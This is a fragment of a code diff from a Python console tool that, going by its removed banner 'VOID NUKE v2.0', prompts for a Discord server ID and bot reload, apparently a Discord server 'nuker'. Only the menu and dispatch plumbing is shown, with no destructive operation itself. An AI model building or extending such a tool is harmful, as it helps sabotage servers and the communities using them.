         _fail(f"Unknown option: {choice!r}"); return guild_id
 
-    label, handler = entry
-    if handler is None:
-        return guild_id   # Shutdown handled in main loop
+    key, label, needs_gid, needs_extra, extra_prompt, color, handler = entry
 
-    color = TEAL
+    # Resolve guild_id if op needs it
+    gid = guild_id
+    if needs_gid and not gid:
+        try:
+            gid = input("  Server ID: ").strip()
+        except (EOFError, KeyboardInterrupt):
+            _warn("Cancelled."); return guild_id
+        if not gid:
+            _warn("No server ID entered, cancelled."); return guild_id
+        guild_id = gid   # persist for this session
+
+    # Resolve extra arg if op needs it
+    extra = None
+    if needs_extra and extra_prompt:
+        try:
+            extra = input(f"  {extra_prompt}").strip() or None
+        except (EOFError, KeyboardInterrupt):
+            extra = None
+
+    ST.reset()
     console.print()
     _sep(RED)
-    console.print(f"  [{RED}]{label.upper()}[/]")
+    console.print(f"  [{color}]{label.upper()}[/]")
     _sep(RED)
     console.print()
 
     t0 = time.time()
     try:
-        guild_id = await handler(guild_id)
+        await handler(gid, extra)
     except KeyboardInterrupt:
         console.print()
-        _warn("Operation interrupted by user.")
+        _warn("Stopped by user.")
     except Exception as e:
         _fail(f"Unexpected error: {type(e).__name__}: {e}")
 
@@ -865,6 +973,7 @@ async def main():
             if raw == "0":
                 break
 
+            # S — set / change server ID
             if raw.upper() == "S":
                 try:
                     gid = input("  Server ID: ").strip()
@@ -875,26 +984,38 @@ async def main():
                         _warn("No ID entered — server unchanged.")
                 except (EOFError, KeyboardInterrupt):
                     pass
-                input("\n  Press Enter to return to the menu…")
+                try:
+                    input("\n  Press Enter to return to the menu…")
+                except (EOFError, KeyboardInterrupt):
+                    break
                 continue
 
-            if raw in ("11", "011"):
+            # R — reload bot / re-auth
+            if raw.upper() == "R":
                 console.print()
                 _sep(RED)
-                console.print(f"  [{YELLOW}]Shutting down VOID NUKE v2.0…[/]")
+                console.print(f"  [{TEAL}]RELOAD BOT[/]")
                 _sep(RED)
-                break
-
-            if raw not in OPERATIONS and raw.lstrip("0") not in OPERATIONS:
-                _fail(f"Unknown option: {raw!r} — enter 0-11 or S")
-                await asyncio.sleep(0.6)
+                console.print()
+                guild_id = await op_reload_bot(guild_id)
+                console.print()
+                try:
+                    input("  Press Enter to return to the menu…")
+                except (EOFError, KeyboardInterrupt):
+                    break
                 continue
 
-            # ── Run the chosen operation ─────────────────────────────────────
-            ST.reset()
-            guild_id = await _dispatch(raw, guild_id)
+            # Normalise zero-padded input (01 → 1)
+            norm = raw.lstrip("0") or "0"
+            if raw not in OPERATIONS and norm not in OPERATIONS:
+                _fail(f"Unknown option: {raw!r} — enter 1-21, S, R, or 0")
+                await asyncio.sleep(0.5)
+                continue
 
-            # ── Always return to menu ────────────────────────────────────────
+            # ── Run the chosen operation ──────────────────────────────────────
+            guild_id = await _dispatch(raw if raw in OPERATIONS else norm, guild_id)
+
+            # ── Always return to menu ─────────────────────────────────────────
             console.print()
             try:
                 input("  Press Enter to return to the menu…")
